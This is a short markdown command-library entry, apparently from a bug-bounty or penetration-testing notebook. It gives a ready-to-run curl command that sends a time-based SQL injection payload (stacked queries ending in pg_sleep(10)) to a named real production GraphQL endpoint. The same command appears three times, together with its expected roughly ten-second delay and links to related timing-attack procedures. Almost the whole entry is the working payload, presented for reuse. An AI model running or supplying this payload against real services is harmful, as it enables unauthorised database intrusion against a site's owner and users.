---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
tags:
  - timing-attack
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.929Z'
id: 248f74ea-c6ab-4e11-b54c-c6de2b9d8213
verified: false
validated: true
submitted: true
---
# time-curl-10s-sleep

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
```

## Description

Verifies injection with 10-second delay timing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Timer | Yes |
| Payload | 10s sleep | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
```

## Expected Output

~10.557s total time.

## Related

- [[commands/time-curl-5s-sleep]]
- [[procedures/Verify-Injection-Using-Timing-Attacks-with-pg_sleep]]
